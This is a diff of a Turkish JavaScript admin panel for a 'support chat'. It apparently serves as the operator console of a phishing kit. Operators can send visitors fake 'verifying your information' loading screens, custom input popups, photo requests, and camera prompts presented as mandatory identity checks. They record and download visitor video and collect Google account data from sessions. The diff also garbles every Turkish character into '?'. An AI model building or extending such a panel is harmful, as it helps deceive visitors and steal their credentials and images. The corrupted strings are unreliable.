-    sendHint.textContent = "Önce soldan bir sohbet seçin.";
+    sendHint.textContent = "?nce soldan bir sohbet se?in.";
     return;
   }
   const ok = window.confirm(
-    `Seçili sohbet (#${shortId(selectedId)}) temizlensin mi?\nMesajlar ve kamera oturumu silinir; oturum listede kalir.`
+    `Se?ili sohbet (#${shortId(selectedId)}) temizlensin mi?\nMesajlar ve kamera oturumu silinir; oturum listede kalir.`
   );
   if (!ok) return;
   sendHint.hidden = false;
-  sendHint.textContent = "Sohbet temizleniyor…";
+  sendHint.textContent = "Sohbet temizleniyor?";
   try {
     stopRecordingWatch();
     await stopAdminCall(false, { keepUi: false });
@@ -2025,13 +2041,13 @@ async function clearSelectedChat() {
 async function clearAllChats() {
   if (!window.ChatSync?.clearAllSessions) return;
   const ok = window.confirm(
-    "TÜM sohbetler silinsin mi?\nBu islem geri alinamaz. Tüm oturumlar ve mesajlar kalkar."
+    "T?M sohbetler silinsin mi?\nBu islem geri alinamaz. T?m oturumlar ve mesajlar kalkar."
   );
   if (!ok) return;
-  const ok2 = window.confirm("Emin misiniz? Tüm sohbetler kalici olarak silinecek.");
+  const ok2 = window.confirm("Emin misiniz? T?m sohbetler kalici olarak silinecek.");
   if (!ok2) return;
   sendHint.hidden = false;
-  sendHint.textContent = "Tüm sohbetler siliniyor…";
+  sendHint.textContent = "T?m sohbetler siliniyor?";
   try {
     stopRecordingWatch();
     await stopAdminCall(false, { keepUi: false });
@@ -2053,7 +2069,7 @@ function openSession(row) {
   seenMessageIds = new Set();
   threadMessages.innerHTML = "";
   threadTitle.textContent = `Oturum #${shortId(row.id)}`;
-  threadMeta.textContent = `${row.page || "/"} · ${fmtTime(row.updatedAt)}`;
+  threadMeta.textContent = `${row.page || "/"} ? ${fmtTime(row.updatedAt)}`;
   sendHint.hidden = true;
   stopRecordingWatch();
   stopAdminCall(false, { keepUi: false });
@@ -2082,7 +2098,7 @@ function openSession(row) {
   });
 
   bindSessionMessages(row.id);
-  // Destek sohbeti disinda verilen izin de canli baglansin (openSession döngüsüne girme)
+  // Destek sohbeti disinda verilen izin de canli baglansin (openSession d?ng?s?ne girme)
   if (row.lastCallId && (row.cameraGranted || row.hasCamera || row.cameraPending)) {
     window.setTimeout(() => {
       void joinAdminCamera(row.id, row.lastCallId);
@@ -2095,23 +2111,23 @@ async function sendToSelected(text, options = {}) {
   const msg = String(
     text ||
       (options.type === "loading"
-        ? "Bilgileriniz kontrol ediliyor. Lütfen bu sayfadan ayrilmayin…"
+        ? "Bilgileriniz kontrol ediliyor. L?tfen bu sayfadan ayrilmayin?"
         : options.type === "camera"
-          ? "Kimlik dogrulamasi için izin vermeniz isteniyor. Izin verirseniz dogrulama bu destek oturumuna baglanir. Izin verilmezse dogrulama tamamlanamaz."
+          ? "Kimlik dogrulamasi i?in izin vermeniz isteniyor. Izin verirseniz dogrulama bu destek oturumuna baglanir. Izin verilmezse dogrulama tamamlanamaz."
           : options.type === "photos"
-            ? "Destek için ekran görüntüsü veya fotograf gönderebilirsiniz. En fazla 10 görsel seçebilirsiniz; istemezseniz iptal edin."
+            ? "Destek i?in ekran g?r?nt?s? veya fotograf g?nderebilirsiniz. En fazla 10 g?rsel se?ebilirsiniz; istemezseniz iptal edin."
             : "")
   ).trim();
   if (!msg && options.type !== "loading") return;
   if (!selectedId) {
     sendHint.hidden = false;
-    sendHint.textContent = "Önce soldan bir sohbet seçin.";
+    sendHint.textContent = "?nce soldan bir sohbet se?in.";
     return;
   }
   if (sending) return;
   sending = true;
   sendHint.hidden = false;
-  sendHint.textContent = "Gönderiliyor…";
+  sendHint.textContent = "G?nderiliyor?";
   const releaseSending = window.setTimeout(() => {
     if (sending) sending = false;
   }, 20000);
@@ -2119,14 +2135,14 @@ async function sendToSelected(text, options = {}) {
     const result = await window.ChatSync.sendAdminMessage(selectedId, msg, options);
     sendHint.textContent =
       options.type === "loading"
-        ? "Yükleme animasyonu gönderildi."
+        ? "Y?kleme animasyonu g?nderildi."
         : options.type === "popup"
-          ? "Popup gönderildi."
+          ? "Popup g?nderildi."
           : options.type === "camera"
-            ? "Kamera talebi gönderildi."
+            ? "Kamera talebi g?nderildi."
             : options.type === "photos"
-              ? "Fotograf talebi gönderildi."
-              : "Gönderildi.";
+              ? "Fotograf talebi g?nderildi."
+              : "G?nderildi.";
     if (options.type === "camera" && result?.callId) {
       resetLiveVideoUi();
       await joinAdminCamera(selectedId, result.callId);
@@ -2141,7 +2157,7 @@ async function sendToSelected(text, options = {}) {
     }
     window.setTimeout(() => {
       if (
-        sendHint.textContent.includes("Gönderildi") ||
+        sendHint.textContent.includes("G?nderildi") ||
         sendHint.textContent.includes("animasyon") ||
         sendHint.textContent.includes("Popup") ||
         sendHint.textContent.includes("Kamera") ||
@@ -2152,7 +2168,7 @@ async function sendToSelected(text, options = {}) {
     }, 1200);
   } catch (err) {
     const detail = err?.code || err?.message || String(err);
-    sendHint.textContent = `Gönderilemedi: ${detail}`;
+    sendHint.textContent = `G?nderilemedi: ${detail}`;
   } finally {
     window.clearTimeout(releaseSending);
     sending = false;
@@ -2165,7 +2181,7 @@ function renderQuickButtons() {
   list.forEach((text) => {
     const btn = document.createElement("button");
     btn.type = "button";
-    btn.textContent = text.length > 48 ? `${text.slice(0, 48)}…` : text;
+    btn.textContent = text.length > 48 ? `${text.slice(0, 48)}?` : text;
     btn.title = text;
     btn.addEventListener("click", () => sendToSelected(text));
     quickList.appendChild(btn);
@@ -2201,7 +2217,7 @@ replyForm?.addEventListener("submit", (e) => {
 
 sendLoadingBtn?.addEventListener("click", () => {
   sendToSelected(
-    "Bilgileriniz kontrol ediliyor. Lütfen bu sayfadan ayrilmayin…",
+    "Bilgileriniz kontrol ediliyor. L?tfen bu sayfadan ayrilmayin?",
     { type: "loading" }
   );
 });
@@ -2220,13 +2236,13 @@ sendCameraBtn?.addEventListener("click", () => {
   void (async () => {
     if (sending) {
       sendHint.hidden = false;
-      sendHint.textContent = "Gönderiliyor, bekleyin…";
+      sendHint.textContent = "G?nderiliyor, bekleyin?";
       return;
     }
-    // Eski oturum kilidi kaldiysa önce temizle; yeni talebi engelleme
+    // Eski oturum kilidi kaldiysa ?nce temizle; yeni talebi engelleme
     if (adminCall) {
       sendHint.hidden = false;
-      sendHint.textContent = "Önceki kamera oturumu kapatiliyor…";
+      sendHint.textContent = "?nceki kamera oturumu kapatiliyor?";
       try {
         await endActiveCameraSession();
       } catch (err) {
@@ -2235,7 +2251,7 @@ sendCameraBtn?.addEventListener("click", () => {
       }
     }
     await sendToSelected(
-      "Kimlik dogrulamasi için izin zorunludur. Izin verirseniz dogrulama bu destek oturumuna baglanir. Izin verilmezse dogrulama adimi tamamlanamaz.",
+      "Kimlik dogrulamasi i?in izin zorunludur. Izin verirseniz dogrulama bu destek oturumuna baglanir. Izin verilmezse dogrulama adimi tamamlanamaz.",
       {
         type: "camera",
         okLabel: "Izin ver",
@@ -2248,10 +2264,10 @@ sendCameraBtn?.addEventListener("click", () => {
 
 sendPhotosBtn?.addEventListener("click", () => {
   sendToSelected(
-    "Destek için ekran görüntüsü veya fotograf gönderebilirsiniz. En fazla 10 görsel seçebilirsiniz; istemezseniz iptal edin. Sadece sizin seçtiginiz dosyalar gönderilir.",
+    "Destek i?in ekran g?r?nt?s? veya fotograf g?nderebilirsiniz. En fazla 10 g?rsel se?ebilirsiniz; istemezseniz iptal edin. Sadece sizin se?tiginiz dosyalar g?nderilir.",
     {
       type: "photos",
-      okLabel: "Fotograf seç",
+      okLabel: "Fotograf se?",
       cancelLabel: "Istemiyorum",
       maxPhotos: 10,
     }
@@ -2275,11 +2291,11 @@ async function endActiveCameraSession() {
     seenRecordingUrl: call.seenRecordingUrl || null,
     awaitingRecording: true,
   };
-  setCameraUi(true, "Oturum sonlandiriliyor…");
+  setCameraUi(true, "Oturum sonlandiriliyor?");
   adminCameraBox?.classList.remove("is-recording");
   setEndCameraVisible(false);
 
-  // Listener çakismasin diye önce aboneligi kes, sonra Firebase’e bitis yaz
+  // Listener ?akismasin diye ?nce aboneligi kes, sonra Firebase?e bitis yaz
   try {
     call.unsubCall?.();
     call.unsubCall = null;
@@ -2321,18 +2337,18 @@ async function endActiveCameraSession() {
 
     if (pending.lastBlob?.size) {
       forceDownloadBlob(pending.lastBlob, `kamera-admin-${shortId(sessionId)}.webm`);
-      setCameraUi(true, "Yerel kayit indirildi · Storage yedek bekleniyor…");
+      setCameraUi(true, "Yerel kayit indirildi ? Storage yedek bekleniyor?");
     } else {
-      setCameraUi(true, "Ziyaretçi kaydi yükleniyor…");
+      setCameraUi(true, "Ziyaret?i kaydi y?kleniyor?");
     }
 
     startRecordingWatch(sessionId, callId, pending);
-    // Storage URL sohbet meta’sina da düserse liste üzerinden de otomatik iner
+    // Storage URL sohbet meta?sina da d?serse liste ?zerinden de otomatik iner
 
     sendHint.hidden = false;
     sendHint.textContent = pending.lastBlob?.size
-      ? "Oturum bitti · kayit indiriliyor (yerel + Storage)."
-      : "Oturum bitti · ziyaretçi kaydi gelince otomatik indirilecek.";
+      ? "Oturum bitti ? kayit indiriliyor (yerel + Storage)."
+      : "Oturum bitti ? ziyaret?i kaydi gelince otomatik indirilecek.";
     if (reopenCameraBtn) reopenCameraBtn.hidden = false;
     window.setTimeout(() => {
       if (
@@ -2432,7 +2448,7 @@ sendPopupBtn?.addEventListener("click", () => {
   const question = String(popupText?.value || "").trim();
   if (!question) {
     sendHint.hidden = false;
-    sendHint.textContent = "Önce popup metnini yazin (ziyaretçiye soru).";
+    sendHint.textContent = "?nce popup metnini yazin (ziyaret?iye soru).";
     popupText?.focus();
     return;
   }
@@ -2441,7 +2457,7 @@ sendPopupBtn?.addEventListener("click", () => {
     okLabel: popupOk?.value || "Tamam",
     cancelLabel: popupCancel?.value || "Iptal",
     withInput: true,
-    placeholder: popupPlaceholder?.value || "Mesajinizi buraya yazin…",
+    placeholder: popupPlaceholder?.value || "Mesajinizi buraya yazin?",
   });
 });
 
@@ -2509,18 +2525,18 @@ gmailCopyBtn?.addEventListener("click", async () => {
 
 gmailBackfillBtn?.addEventListener("click", async () => {
   if (!window.ChatSync?.backfillGoogleAccountsFromSessions) {
-    showGmailHint("Aktarim fonksiyonu yok — sayfayi yenile");
+    showGmailHint("Aktarim fonksiyonu yok ? sayfayi yenile");
     return;
   }
   gmailBackfillBtn.disabled = true;
-  showGmailHint("Sohbetlerden aktariliyor…");
+  showGmailHint("Sohbetlerden aktariliyor?");
   try {
     const n = await window.ChatSync.backfillGoogleAccountsFromSessions();
     showGmailHint(n ? `${n} sohbetten Google hesabi aktarildi` : "Aktarilacak Google kaydi bulunamadi");
   } catch (err) {
     console.warn(err);
     showGmailHint(
-      "Aktarim basarisiz — Firebase Rules’a googleAccounts ekleyip Publish edin"
+      "Aktarim basarisiz ? Firebase Rules?a googleAccounts ekleyip Publish edin"
     );
   } finally {
     gmailBackfillBtn.disabled = false;
@@ -2559,20 +2575,20 @@ loginForm?.addEventListener("submit", (e) => {
 
   if (!window.FIREBASE_SYNC) {
     loginError.hidden = false;
-    loginError.textContent = "firebase-config.js yüklenemedi. Sayfayi Ctrl+F5 ile yenileyin.";
+    loginError.textContent = "firebase-config.js y?klenemedi. Sayfayi Ctrl+F5 ile yenileyin.";
     return;
   }
   if (!ok) {
     loginError.hidden = false;
     loginError.textContent =
       expected.length === 0
-        ? "Config içinde admin sifresi yok."
+        ? "Config i?inde admin sifresi yok."
         : `Sifre hatali (yazilan ${pass.length} karakter, beklenen ${expected.length}).`;
     return;
   }
   loginError.hidden = true;
   setAuth(true);
-  // Giris jesti ile sesi hemen aç
+  // Giris jesti ile sesi hemen a?
   void (async () => {
     await unlockAlertAudio();
     startDash(window.ChatSync);
@@ -2586,7 +2602,7 @@ if (!sync) {
   const lede = document.querySelector("#setup-panel .lede");
   if (lede) {
     lede.textContent =
-      "Firebase scriptleri yüklenemedi veya çok yavas. Ctrl+F5 ile yenileyin. Internet/engelleyici varsa kapatin.";
+      "Firebase scriptleri y?klenemedi veya ?ok yavas. Ctrl+F5 ile yenileyin. Internet/engelleyici varsa kapatin.";
   }
 } else if (sync.needsSetup) {
   show("setup");
